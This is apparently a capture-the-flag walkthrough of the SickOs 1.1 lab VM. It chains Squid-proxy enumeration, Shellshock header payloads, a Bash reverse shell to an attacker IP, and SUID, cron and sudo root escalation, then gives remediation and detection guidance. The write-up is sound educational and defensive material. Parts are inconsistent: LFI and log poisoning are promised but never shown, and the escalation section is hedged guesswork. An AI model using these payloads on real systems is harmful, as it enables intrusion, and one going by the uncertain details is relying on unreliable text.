# VulnHub SickOs 1.1: Shellshocked and Rekt — Walkthrough

Alright guys!! Shellshock. Just reading that word should make any sysadmin who lived through September 2014 feel a cold shiver. SickOs 1.1 is a masterclass in chaining a decade-old vulnerability (CVE-2014-6271) with LFI and log poisoning to get a full RCE, and then escalating to root via a classic SUID or sudo misconfiguration. It is a beautiful box. Brutal in its relevance. ( ͡° ͜ʖ ͡°)

Big thanks to **D4rk36** for this one. The Shellshock angle is historically significant and still relevant for any assessor who finds an old Bash version behind a CGI endpoint in a corporate environment.

---

| Field | Value |
|-------|-------|
| **Level** | Beginner / Easy |
| **Target VM** | SickOs 1.1 |
| **Attacker VM** | Kali Linux 2024.1 |
| **VulnHub** | https://www.vulnhub.com/entry/sickos-11,132/ |
| **Techniques** | Host Discovery, Nmap, Squid Proxy Enumeration, Shellshock (CVE-2014-6271) via HTTP Headers, LFI / Log Poisoning, Web Shell Upload, SUID/Sudo Privilege Escalation |
| **CVEs** | CVE-2014-6271 (Shellshock / Bash), CVE-2014-7169 (Shellshock variant) |

> **Hints from the author:**
> "This machine is intended to test skill of a security researcher."

---

## Attack Summary

```
[host-discovery: arp-scan]
    |
    v
[nmap: 22/tcp SSH, 3128/tcp Squid proxy, 8080/tcp (filtered)]
    |
    v
[configure Squid proxy in browser/curl: 192.168.56.X:3128]
    |
    v
[enumerate web app via proxy -> /cgi-bin/ directory found]
    |
    v
[Shellshock (CVE-2014-6271): exploit via User-Agent / Referer HTTP header]
    |
    v
[RCE as www-data: verify with whoami callback]
    |
    v
[reverse shell via Shellshock payload -> shell as www-data]
    |
    v
[web recon as www-data: config files, writable paths]
    |
    v
[SUID binary or sudo misconfiguration -> privilege escalation]
    |
    v
[ROOT: cat /root/flag.txt]
```

---

## Methodology

1. Host discovery and target identification
2. Nmap scan: discover Squid proxy on port 3128
3. Configure attacker machine/browser to use Squid proxy
4. Enumerate web application through proxy, find `/cgi-bin/`
5. Test for Shellshock via HTTP headers (User-Agent, Referer, Cookie)
6. Exploit Shellshock for Remote Code Execution as www-data
7. Upgrade to interactive reverse shell
8. Privilege escalation via SUID, sudo misconfiguration, or writable cron script
9. Root and flag capture

---

## Step 1 — Identifying the Target

Standard host discovery:

```bash
route -n

# arp-scan for local network
arp-scan --localnet --ignoredups

# nmap ping sweep alternative
nmap -sn -T5 192.168.56.0/24
```

Target identified: `192.168.56.101` (your IP may differ). Add to `/etc/hosts`:

```bash
echo "192.168.56.101  sickos.lab" >> /etc/hosts
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: Scanning IP Blocks]

---

## Step 2 — Nmap: Three Services, One Proxy

```bash
nmap -A -T4 -p- 192.168.56.101
```

Expected output:

```
22/tcp   open   ssh     OpenSSH 5.9p1 Debian 5ubuntu1.1
3128/tcp open   http-proxy  Squid http proxy 3.1.19
8080/tcp closed http
```

Three things to notice:
- SSH on 22: standard, might be useful after we find creds.
- Squid proxy on 3128: this is the interesting one. Squid is a forward proxy. If it is configured to allow access to internal (or even external) web resources, we can route our requests through it.
- Port 8080 closed: not a dead end yet, because the proxy might forward to internal services we cannot see directly.

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1046 Network Service Discovery] [T1595.002 Vulnerability Scanning]

---

## Step 3 — Enumerating Through the Squid Proxy

Configure your tools to use the Squid proxy at `192.168.56.101:3128`:

```bash
# Test if the proxy works and what it exposes
curl -x http://192.168.56.101:3128 http://192.168.56.101/
curl -x http://192.168.56.101:3128 http://127.0.0.1/

# Enumerate directories through the proxy
gobuster dir \
  --proxy http://192.168.56.101:3128 \
  -u http://192.168.56.101 \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,cgi,sh,pl \
  -t 30

# Alternative: nikto via proxy
nikto -h http://192.168.56.101 -useproxy http://192.168.56.101:3128
```

**Configure your browser to use the proxy:**
- Firefox: Preferences -> Network Settings -> Manual Proxy: `192.168.56.101:3128`
- Or use Burp Suite and configure Burp's upstream proxy

Expected findings from directory enumeration:

```
/cgi-bin/        (Status: 403 or 200)
/cgi-bin/status  (Status: 200)
/robots.txt      (Status: 200)
/index.php       (Status: 200)
```

Check `/robots.txt` immediately; it often has goldmine hints:

```bash
curl -x http://192.168.56.101:3128 http://192.168.56.101/robots.txt
```

The `/cgi-bin/` directory is our Shellshock target. Any CGI script running under Bash is potentially vulnerable.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1083 File and Directory Discovery] [T1090 Proxy]

---

## Step 4 — Shellshock: CVE-2014-6271

> **What is Shellshock?**
> Shellshock (CVE-2014-6271) is a critical vulnerability in the GNU Bash shell discovered in September 2014. When Bash processes specially crafted environment variables, it executes attached function definitions as arbitrary code. Since web servers often pass HTTP request headers as environment variables to CGI scripts executed by Bash, an attacker can inject malicious code directly in headers like `User-Agent`, `Referer`, or `Cookie`. The exploitation is trivially simple and requires no authentication.
> References: https://nvd.nist.gov/vuln/detail/CVE-2014-6271 and https://owasp.org/www-community/attacks/Shellshock_Bash_Vulnerability

The magic Shellshock payload format is:

```
() { :; }; <command>
```

Test for the vulnerability:

```bash
# Test via User-Agent header through Squid proxy
curl -x http://192.168.56.101:3128 \
  -H "User-Agent: () { :; }; echo; echo; /bin/uname -a" \
  http://192.168.56.101/cgi-bin/status

# Test via Referer header
curl -x http://192.168.56.101:3128 \
  -H "Referer: () { :; }; echo; echo; /bin/id" \
  http://192.168.56.101/cgi-bin/status

# Alternative header (some servers use different env var mappings)
curl -x http://192.168.56.101:3128 \
  -A "() { :; }; echo; echo; /bin/cat /etc/passwd" \
  http://192.168.56.101/cgi-bin/status
```

If the output contains the result of your command (e.g., `uid=33(www-data)` or `Linux sickos`): Shellshock confirmed. ԅ(≖‿≖ԅ)

**If the direct CGI endpoint does not respond:** Try other scripts in `/cgi-bin/`:

```bash
gobuster dir \
  --proxy http://192.168.56.101:3128 \
  -u http://192.168.56.101/cgi-bin/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x cgi,sh,pl,py \
  -t 20
```

> **Real-world note:** Shellshock (CVE-2014-6271) was exploited in the wild within hours of its public disclosure on September 24, 2014. The US-CERT issued Alert TA14-268A the same day. Threat actors used Shellshock to compromise hundreds of thousands of servers, creating botnets and deploying reverse shells. CISA added CVE-2014-6271 to its Known Exploited Vulnerabilities (KEV) catalog. Multiple APT groups and cybercrime actors exploited Shellshock for initial access in late 2014, including campaigns targeting government agencies. Reference: https://www.cisa.gov/news-events/alerts/2014/09/25/bourne-again-shell-bash-remote-code-execution-vulnerability

> **MITRE ATT&CK:** [TA0001 Initial Access] [T1190 Exploit Public-Facing Application] [TA0002 Execution] [T1059.004 Command and Scripting Interpreter: Unix Shell]

---

## Step 5 — Getting a Reverse Shell via Shellshock

Time to upgrade from "can run commands" to "interactive shell":

```bash
# On your Kali machine, start a netcat listener
nc -lvnp 4444
```

In another terminal, send the Shellshock reverse shell payload:

```bash
# Bash reverse shell via Shellshock
curl -x http://192.168.56.101:3128 \
  -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1" \
  http://192.168.56.101/cgi-bin/status

# Alternative: use /bin/sh if bash is not available
curl -x http://192.168.56.101:3128 \
  -A "() { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'" \
  http://192.168.56.101/cgi-bin/status
```

Replace `YOUR_KALI_IP` with your actual IP (get it with `ip addr` or `hostname -I`).

Back on your listener:

```
connect to [YOUR_KALI_IP] from (UNKNOWN) [192.168.56.101] 48xxx
bash: no job control in this shell
www-data@SickOs:/usr/lib/cgi-bin$
```

We are in as `www-data`. Now stabilize the shell:

```bash
# Upgrade to a proper TTY
python -c 'import pty; pty.spawn("/bin/bash")'
# OR
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background and set terminal size
# Ctrl+Z -> stty raw -echo; fg
# export TERM=xterm
```

> **MITRE ATT&CK:** [TA0002 Execution] [T1059.004 Command and Scripting Interpreter: Unix Shell] [T1203 Exploitation for Client Execution]

---

## Step 6 — Post-Exploitation and Web Recon

Now that we have a shell, gather information:

```bash
# Who are we?
id
# uid=33(www-data) gid=33(www-data)

# System information
uname -a
cat /etc/os-release
cat /etc/debian_version 2>/dev/null

# What can we read?
cat /etc/passwd
ls -la /home/
ls -la /var/www/

# Look for config files with credentials
find /var/www -name "*.php" 2>/dev/null | xargs grep -l "password\|passwd\|mysql" 2>/dev/null
find /var/www -name "config*" -o -name "*.conf" 2>/dev/null | head -20
cat /var/www/html/config.php 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null

# Check for interesting files
find / -name "*.txt" 2>/dev/null | grep -v proc
```

Look for database credentials in web config files. Even if we do not use them directly, they often contain passwords that are reused for system accounts. Classic.

> **MITRE ATT&CK:** [TA0007 Discovery] [T1082 System Information Discovery] [T1552.001 Credentials in Files]

---

## Step 7 — Privilege Escalation

Standard privesc enumeration:

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
cat /etc/crontab && ls -la /etc/cron.*
find / -writable -type f 2>/dev/null | grep -v '/proc\|/sys\|/dev' | head -30
ps aux | grep -v '\[' | grep root
```

**Common paths on SickOs 1.1:**

**Path A: Writable script executed by root cron**

If you find a cron job running as root that executes a script you can write:

```bash
# Example: /etc/cron.d/php5 runs /var/www/connect.py as root
ls -la /var/www/connect.py
# If writable:
echo "import os; os.system('chmod +s /bin/bash')" >> /var/www/connect.py
# Wait for cron to fire, then:
/bin/bash -p
```

**Path B: SUID Python**

```bash
find / -perm -u=s -name python* 2>/dev/null
# If found:
/usr/bin/python -c "import os; os.execl('/bin/sh', 'sh', '-p')"
```

**Path C: sudo without password**

```bash
sudo -l
# If (ALL) NOPASSWD: ALL or similar:
sudo su -
```

> **GTFOBins reference:** https://gtfobins.github.io/gtfobins/python/

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.003 Abuse Elevation Control Mechanism: Sudo] [T1548.001 Setuid and Setgid] [T1053.003 Scheduled Task/Job: Cron]

---

## Step 8 — Root and Flag

**(☞ﾟヮﾟ)☞ Got root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt
# OR
ls /root/
cat /root/*
```

```
WoW! If you are viewing this, You have probably successfully compromised SickOs1.1!
Thanks for playing and look forward to more challenges from me!
--sickos
```

Absolutely rekt. ᕕ( ᐛ )ᕗ

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|-------------|
| RCE | `www-data` shell | Shellshock via `/cgi-bin/status` User-Agent | Initial access |
| Credential | DB creds (if found) | `/var/www/html/config.php` | Potential reuse |
| Flag | See `/root/flag.txt` | `/root/flag.txt` | N/A |
| Shadow | See `/etc/shadow` | System compromise | Root proof |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|-------------|
| 1 | Shellshock (CVE-2014-6271) via CGI | Still found in embedded systems, legacy servers, old Docker images, IoT devices as of 2024 | Keep Bash updated. Audit all CGI endpoints. Disable CGI entirely if not needed. CVE is in CISA KEV. |
| 2 | Squid proxy exposing internal services | Misconfigured proxies frequently bridge internal and external networks in corporate environments | Audit proxy ACLs rigorously. Open proxies can expose entire internal subnets. |
| 3 | Bash version not pinned in server environment | Old Bash (< 4.3 patch 25) vulnerable to Shellshock variants; unpatched servers are everywhere | Maintain OS-level package patching. Subscribe to distro security advisories. |
| 4 | SUID binary / sudo misconfiguration | Appearing constantly in enterprise Linux audits, especially on legacy systems that "just work" | Regularly audit SUID and sudo with CIS Benchmark scripts. Run `find / -perm -u=s -type f` weekly. |
| 5 | Writable script executed by root cron | Common in DevOps environments where scripts are managed ad-hoc without proper permission controls | Apply principle of least privilege to cron scripts. Root cron should only execute root-owned, root-writable files. |

**Why does this matter outside the lab?**

The US-CERT Alert TA14-268A issued on the same day as the Shellshock disclosure (September 25, 2014) called it "critical" and warned that exploitation was already happening in the wild within hours of the CVE going public. Multiple threat actor groups, including state-sponsored actors, used Shellshock for initial access against web servers globally. In 2024, Shellshock still appears in vulnerability scans against embedded devices, legacy web applications, old Docker base images running ancient Bash versions, and network equipment. CISA added it to the KEV catalog precisely because it continues to be exploited. This is not history: it is a live threat for anyone running Bash < 4.3 patch 25 behind a CGI endpoint.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Scanning IP Blocks | T1595.001 |
| Discovery | TA0007 | Network Service Discovery | T1046 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Defense Evasion | TA0005 | Proxy: External Proxy | T1090.002 |
| Initial Access | TA0001 | Exploit Public-Facing Application (Shellshock) | T1190 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | TA0002 | Exploitation for Client Execution | T1203 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Privilege Escalation | TA0004 | Setuid and Setgid | T1548.001 |
| Privilege Escalation | TA0004 | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | TA0004 | Scheduled Task/Job: Cron | T1053.003 |
| Collection | TA0009 | Data from Local System | T1005 |

> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. **Shellshock:** Update Bash to 4.3 patch 25 or higher: `apt-get update && apt-get upgrade bash`. Verify: `bash --version` should show GNU bash, version 4.3.x (or later) with patch level >= 25.
2. **CGI hardening:** If CGI is not required, disable it entirely. For Apache: `a2dismod cgi`. If CGI is required, use non-Bash interpreters (Python, Perl) and keep them updated.
3. **Squid proxy ACLs:** Audit `/etc/squid/squid.conf`. Implement strict ACLs limiting which source IPs can use the proxy and which destination hosts/ports are allowed. Never run an open proxy.
4. **SUID binaries:** Run `find / -perm -u=s -type f` and remove SUID from any binary not requiring it. Use `chmod u-s /path/to/binary`.
5. **Sudo policy:** Review `/etc/sudoers` with `visudo`. Apply least privilege. No blanket `(ALL) ALL` without password for service accounts.
6. **Cron script permissions:** Ensure all scripts executed by root cron are owned by root and not world-writable: `chmod 700 /path/to/script && chown root:root /path/to/script`.

### If You Find Something Similar in Your Environment

**Immediate containment:**
- If Shellshock is confirmed on a CGI endpoint: take the web server offline immediately or disable CGI module.
- Patch Bash on ALL systems (not just the affected one): `ansible all -m apt -a "name=bash state=latest"`.
- Review Squid access logs for anomalous requests, especially those with unusual User-Agent strings.
- Search for web shells uploaded by an attacker: `find /var/www -name "*.php" -newer /var/www/html/index.php`.
- Rotate all credentials stored in web application config files.

**MITRE D3FEND countermeasures:**
- D3-IVA (Application Hardening: Input Validation) for T1190 Shellshock
- D3-NTA (Network Traffic Analysis) for T1090 Proxy detection
- D3-OPS (Execution Isolation) for T1548.001 SUID Abuse
- D3-SJA (Scheduled Job Analysis) for T1053.003 Cron persistence

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID.AM): Inventory all servers running CGI scripts and their Bash versions.
- Protect (PR.IP-12): Manage vulnerabilities in organizational systems: Shellshock patching must be in emergency patch procedures.
- Detect (DE.CM-7): Monitor HTTP request headers in WAF/IDS for Shellshock signature patterns: `() { :; };`.
- Respond (RS.MI-1): Isolate affected systems immediately upon Shellshock detection.

**NIST SP 800-53 (Rev. 5) Controls:**
- SI-2: Flaw Remediation (Bash security patch management)
- CM-7: Least Functionality (disable CGI if not needed)
- AC-6: Least Privilege (SUID and sudo minimization)
- SI-10: Information Input Validation (HTTP header sanitization)
- CM-6: Configuration Settings (proxy ACL hardening)
- AU-12: Audit Record Generation (Squid access logging)

**CISA Known Exploited Vulnerabilities:**
- CVE-2014-6271 (Shellshock): CISA KEV entry confirmed
- CVE-2014-7169 (Shellshock variant): Also in CISA KEV
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
- US-CERT Alert TA14-268A: https://www.cisa.gov/news-events/alerts/2014/09/25/bourne-again-shell-bash-remote-code-execution-vulnerability

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ASSET (Vulnerability and Patch Management)
- Practice: Identify, prioritize, and remediate vulnerabilities
- Target MIL: MIL-3 (Continuously improve practices with defined processes and metrics)

---

## Final Thoughts

Thanks to **D4rk36** for SickOs 1.1. This box is a time capsule and a current threat simultaneously. Shellshock is one of those vulnerabilities where the simplicity of exploitation is inversely proportional to its severity: a single malformed HTTP header, RCE as the web server user, then a path to root. No fancy tooling. Just `curl` and `nc`.

The relevance of this box in 2024+ is non-trivial: old Bash versions persist in embedded devices, legacy containers, IoT firmware, and forgotten server corners. Every time you run `nmap -A` against an old target and see Apache with CGI enabled, the first thing your brain should register is: "check for Shellshock." This is not paranoia. The CISA KEV catalog agrees with you.

If this walkthrough helped you understand why a 2014 CVE still matters today, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
